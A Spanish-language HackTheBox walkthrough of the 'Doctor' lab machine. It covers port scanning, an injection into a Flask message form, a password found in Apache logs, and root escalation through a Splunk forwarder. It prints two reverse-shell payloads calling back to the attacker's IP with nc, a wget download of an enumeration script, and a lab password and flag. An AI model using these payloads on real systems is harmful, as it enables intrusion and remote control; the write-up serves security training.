I"C5<h2 id="resumen">Resumen:</h2>

<p>Hacemos el primer reconocimiento en el puerto <code class="language-plaintext highlighter-rouge">80 http</code> donde nos encontraremos con un posible nombre de dominio <code class="language-plaintext highlighter-rouge">doctors.htb</code>.</p>

<p>Una vez agregado al file <code class="language-plaintext highlighter-rouge">/etc/hosts/</code> La pagina nos mostrara un sistema de posts-mensajeria el cual es vulnerable a ataques de tipo server-side-template-injection <code class="language-plaintext highlighter-rouge">(SSTI)</code>. Si proporcionamos un link en el contenido del mensaje, la maquina accederá al mismo a través de curl, con lo cual podemos craftear un payload y con esto seremos capaces de obtener la primera reverse shell.</p>

<p>Aún debemos escalar de usuario, y solo bastara con ejecutar un <code class="language-plaintext highlighter-rouge">linepeash.sh</code> y encontraremos el pass de shaun en los logs de apache.</p>

<p>Como ultimo paso 
nos quedaria la escalacion de privilegios hacia root, donde nos aprovecharemos de la vulnerabilidad del <code class="language-plaintext highlighter-rouge">splunkforwarder</code> que esta corriendo en el <code class="language-plaintext highlighter-rouge">puerto 8089</code> con el exploit <a href="https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2"><strong>SplunkWhisperer2</strong></a> para finalmente obtener el <code class="language-plaintext highlighter-rouge">root.txt</code>.</p>

<hr />

<h2 id="pwned">Pwned</h2>
<link rel="stylesheet" type="text/css" href="/assets/css/asciinema-player.css" />

<asciinema-player src="/htb/doctor/2.cast" cols="107" rows="24"></asciinema-player>
<script type="text/javascript" src="/assets/js/asciinema-player.js"></script>

<hr />

<h2 id="reconocimiento">Reconocimiento</h2>
<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre></td> --><td class="rouge-code"><pre><span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-09 18:06 EST
Nmap scan report for doctors.htb (10.10.10.209)
Host is up (0.23s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE  VERSION
</span><span class="gp">22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>
<span class="go">80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
| http-server-header: 
|   Apache/2.4.41 (Ubuntu)
|_  Werkzeug/1.0.1 Python/3.8.2
| http-title: Doctor Secure Messaging - Login
|_Requested resource was http://doctors.htb/login?next=%2F
8089/tcp open  ssl/http Splunkd httpd
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Splunkd
|_http-title: splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2020-09-06T15:57:27
|_Not valid after:  2023-09-06T15:57:27
</span><span class="gp">Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
<span class="go">
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.53 seconds
</span></pre></td></tr></tbody></table></code></pre></div></div>
<hr />

<p>Como podemos ver hay un correo con un posible nombre de dominio <code class="language-plaintext highlighter-rouge">doctors.htb</code></p>

<h2><img src="/htb/doctor/1.png" alt="Desktop View" /></h2>
<h2 id="nombre-de-dominio">Nombre de Dominio</h2>
<p>Lo agregamos en nuestro archivo <code class="language-plaintext highlighter-rouge">hosts</code> para poder acceder.</p>
<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre><span class="go">nano /etc/hosts
</span></pre></td></tr></tbody></table></code></pre></div></div>
<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td> --><td class="rouge-code"><pre><span class="go">127.0.0.1       localhost
127.0.1.1       kali
10.10.10.209    doctors.htb
</span></pre></td></tr></tbody></table></code></pre></div></div>
<hr />

<h2 id="ssti">SSTI</h2>

<p>Una vez en doctors.htb nos encontramos con un sistema de posts/mensajeria donde tendremos que <code class="language-plaintext highlighter-rouge">registrarnos</code> y <code class="language-plaintext highlighter-rouge">logearnos</code>.
<img src="/htb/doctor/4.png" alt="Desktop View" />
<img src="/htb/doctor/6.png" alt="Desktop View" />
Creamos un nuevo mensaje <code class="language-plaintext highlighter-rouge">New Message</code>
<img src="/htb/doctor/7.png" alt="Desktop View" /></p>

<hr />

<p>La web esta usando <code class="language-plaintext highlighter-rouge">flask</code> la cual puede ser vulnerable a server-side-template-injection <a href="https://medium.com/server-side-template-injection/server-side-template-injection-faf88d0c7f34"><strong>SSTI Payloads</strong></a>.</p>

<p><img src="/htb/doctor/12.png" alt="Desktop View" />
Capturamos el request con Burp Suite e Inyectamos con el siguiente payload: <code class="language-plaintext highlighter-rouge">title=curl+http%3A%2F%2Fip%2F%24%28nc.traditional%24IFS%252710.10.15.31%2527%24IFS%25274949%2527%24IFS-e%24IFS%2Fbin%2Fsh%29&amp;content=curl http://ip/$(nc.traditional$IFS%2710.10.14.230%27$IFS%274949%27$IFS-e$IFS/bin/sh)dbody&amp;submit=Post</code></p>

<p>Una vez dentro, podemos usar nuestra llave pública para logearnos con <code class="language-plaintext highlighter-rouge">ssh</code>.</p>
<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td> --><td class="rouge-code"><pre><span class="gp">web@doctor:~/.ssh$</span><span class="w"> </span><span class="nb">ls</span>
<span class="go">ls
authorized_keys
</span></pre></td></tr></tbody></table></code></pre></div></div>
<hr />

<asciinema-player src="/htb/doctor/1.cast" cols="107" rows="24"></asciinema-player>
<hr />

<h2 id="privesc-shaun">Privesc Shaun</h2>

<p>Subimos el linpeash para enumerar</p>
<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td> --><td class="rouge-code"><pre><span class="go">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.209 - - [09/Nov/2020 18:48:11] "GET /linpeash.sh HTTP/1.1" 200 -
</span></pre></td></tr></tbody></table></code></pre></div></div>
<hr />

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td> --><td class="rouge-code"><pre><span class="gp">web@doctor:~$</span><span class="w"> </span>wget 10.10.15.31/linpeash.sh
<span class="go">
--2020-11-10 00:48:10--  http://10.10.15.31/linpeash.sh
Connecting to 10.10.15.31:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 294784 (288K) [text/x-sh]
Saving to: ‘linpeash.sh’

</span><span class="gp">linpeash.sh 100%[==========================================================================================&gt;</span><span class="o">]</span> 287,88K   208KB/s    <span class="k">in </span>1,4s    
<span class="go">
2020-11-10 00:48:12 (208 KB/s) - ‘linpeash.sh’ saved [294784/294784]
</span></pre></td></tr></tbody></table></code></pre></div></div>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre><span class="gp">web@doctor:~$</span><span class="w"> </span><span class="nb">chmod</span> +x linpeash.sh 
</pre></td></tr></tbody></table></code></pre></div></div>

<p>En los logs del apache nos encontramos con el password del usuario shaun ` Guitar123` .</p>
<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre><span class="go">/var/log/apache2/backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"
</span></pre></td></tr></tbody></table></code></pre></div></div>
<p><img src="/htb/doctor/11.png" alt="Desktop View" /></p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td> --><td class="rouge-code"><pre><span class="gp">web@doctor:~$</span><span class="w"> </span>su shaun
<span class="go">Password: Guitar123
</span></pre></td></tr></tbody></table></code></pre></div></div>
<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td> --><td class="rouge-code"><pre><span class="gp">shaun@doctor:~$</span><span class="w"> </span><span class="nb">cat </span>user.txt 
<span class="go">5eb4d98c4564ab31f0a9e00c8899d522
</span></pre></td></tr></tbody></table></code></pre></div></div>
<hr />

<h2 id="privesc-root">Privesc Root</h2>

<p>Luego de enumerar un poco podemos darnos cuenta que se esta ejecutando el <code class="language-plaintext highlighter-rouge">splunkforwarder</code>, en este caso, si esta mal configurado podemos escalar privilegios bajo el usuario el cual esta corriendo el forwarder. <a href="https://medium.com/@airman604/splunk-universal-forwarder-hijacking-5899c3e0e6b2"><strong>Exploit Splunk Forwarder Explicación</strong></a>
<img src="/htb/doctor/10.png" alt="Desktop View" /></p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td> --><td class="rouge-code"><pre><span class="gp">shaun@doctor:/opt$</span><span class="w"> </span><span class="nb">ls</span>
<span class="go">splunkforwarder
</span></pre></td></tr></tbody></table></code></pre></div></div>
<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre><span class="go">tcp        0      0 0.0.0.0:8089            0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
</span></pre></td></tr></tbody></table></code></pre></div></div>

<h3 id="exploiting-splunk-forwarder">Exploiting Splunk Forwarder</h3>

<p>Ahora que tenemos información de como podemos explotar el splunk forwarder, nos queda descargarnos la herramienta. <a href="https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2"><strong>SplunkWhisperer2</strong></a></p>

<p>Abrimos 2 Shells 
En la primera:</p>
<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre><span class="gp">kali@kali: python PySplunkWhisperer2_remote.py --lhost 10.10.15.31 --host 10.10.10.209 --username shaun --password Guitar123 --payload '/bin/bash -c "rm /tmp/deed;</span><span class="nb">mkfifo</span> /tmp/deed<span class="p">;</span><span class="nb">cat</span> /tmp/deed|/bin/sh <span class="nt">-i</span> 2&gt;&amp;1|nc 10.10.15.31 3748 <span class="o">&gt;</span>/tmp/deed<span class="s2">"'
</span></pre></td></tr></tbody></table></code></pre></div></div>
<p>En la Segunda nos ponemos a la escucha:</p>
<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td> --><td class="rouge-code"><pre><span class="go">nc -lvnp 3748
listening on [any] 3748 ...
connect to [10.10.15.31] from (UNKNOWN) [10.10.10.209] 54452
</span><span class="gp">/bin/sh: 0: can't access tty;</span><span class="w"> </span>job control turned off
</pre></td></tr></tbody></table></code></pre></div></div>

<hr />

<asciinema-player src="/htb/doctor/2.cast" cols="107" rows="24"></asciinema-player>

<hr />

<p><img src="/htb/doctor/pwned.gif" alt="Desktop View" /></p>

<hr />

<h2 id="recursos">Recursos</h2>

<table>
  <thead>
    <tr>
      <th style="text-align: left">Topics</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left"><a href="https://medium.com/server-side-template-injection/server-side-template-injection-faf88d0c7f34"><strong>SSTI Payloads</strong></a></td>
    </tr>
    <tr>
      <td style="text-align: left"><a href="https://medium.com/@airman604/splunk-universal-forwarder-hijacking-5899c3e0e6b2"><strong>Exploit Splunk Forwarder</strong></a></td>
    </tr>
  </tbody>
</table>

<hr />

:ET